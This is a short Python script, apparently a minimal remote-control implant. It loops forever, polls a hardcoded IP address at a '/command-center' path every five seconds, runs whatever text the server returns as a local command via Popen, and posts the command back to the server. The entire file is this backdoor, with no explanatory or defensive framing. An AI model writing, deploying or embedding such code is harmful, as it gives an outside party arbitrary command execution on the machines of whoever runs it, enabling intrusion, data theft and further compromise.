from requests import post, get
from subprocess import Popen
from time import sleep

DELAY = 5
IP = "143.42.110.206"
PORT = 80
SCHEME = "http"


def main() -> None:
    while True:
        get_commands_response = get(f"{SCHEME}://{IP}:{PORT}/command-center")
        if get_commands_response.status_code != 204:
            Popen(get_commands_response.text)
            post(
                f"{SCHEME}://{IP}:{PORT}/command-center",
                data={"command": get_commands_response.text},
            )
        sleep(DELAY)


if __name__ == "__main__":
    main()
